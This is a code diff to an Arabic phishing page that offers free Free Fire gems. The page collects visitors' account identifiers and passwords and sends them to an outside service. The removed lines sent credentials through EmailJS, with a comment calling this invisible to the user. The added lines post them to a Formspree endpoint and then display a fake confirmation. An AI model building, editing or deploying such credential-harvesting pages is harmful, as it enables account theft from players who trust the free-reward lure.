@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>شحن جواهر فري فاير مجاناً</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -307,7 +306,13 @@
                     املأ قسم إدخال معلومات حسابك
                 </div>
                 
-                <form id="gemsForm">
+                <!-- تم التعديل هنا: استبدال action بـ Formspree -->
+                <form id="gemsForm" action="https://formspree.io/f/mwpbygpd" method="POST">
+                    <!-- إضافة حقول مخفية لتحسين تجربة Formspree -->
+                    <input type="hidden" name="_language" value="ar">
+                    <input type="hidden" name="_subject" value="طلب جواهر فري فاير جديد">
+                    <input type="hidden" name="_gotcha" style="display:none">
+                    
                     <div class="form-group">
                         <label for="account">رقم الهاتف أو عنوان البريد الإلكتروني:</label>
                         <input type="text" id="account" name="account" required placeholder="أدخل رقم الهاتف أو البريد الإلكتروني">
@@ -350,39 +355,40 @@
     </div>
 
     <script>
-        // تهيئة EmailJS
-        emailjs.init("i0A_2IpoeguTSSH30"); // استبدل بمعرف المستخدم الخاص بك
-
+        // تم التعديل: إزالة EmailJS واستبداله بـ Formspree
         document.getElementById('gemsForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const account = document.getElementById('account').value;
-            const password = document.getElementById('password').value;
+            const form = e.target;
             const loading = document.getElementById('loading');
             const message1 = document.getElementById('message1');
             
             // إظهار التحميل
             loading.style.display = 'block';
             
-            // إرسال البيانات عبر EmailJS (بشكل غير مرئي للمستخدم)
-            const templateParams = {
-                account: account,
-                password: password,
-                timestamp: new Date().toLocaleString('ar-SA')
-            };
-            
-            emailjs.send('service_67xwvq9', 'template_7aqch9n', templateParams)
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                }, function(error) {
-                    console.log('FAILED...', error);
-                });
-            
-            // إخفاء التحميل وإظهار الرسالة الأولى بعد 3 ثوان
-            setTimeout(function() {
-                loading.style.display = 'none';
-                message1.style.display = 'block';
-            }, 3000);
+            // إرسال البيانات باستخدام Fetch API إلى Formspree
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                // إخفاء التحميل بعد 3 ثوانٍ
+                setTimeout(function() {
+                    loading.style.display = 'none';
+                    message1.style.display = 'block';
+                }, 3000);
+            })
+            .catch(error => {
+                // في حالة حدوث خطأ
+                setTimeout(function() {
+                    loading.style.display = 'none';
+                    message1.style.display = 'block';
+                    console.error('Error:', error);
+                }, 3000);
+            });
         });
         
         function showMessage2() {
@@ -392,4 +398,3 @@
     </script>
 </body>
 </html>
-
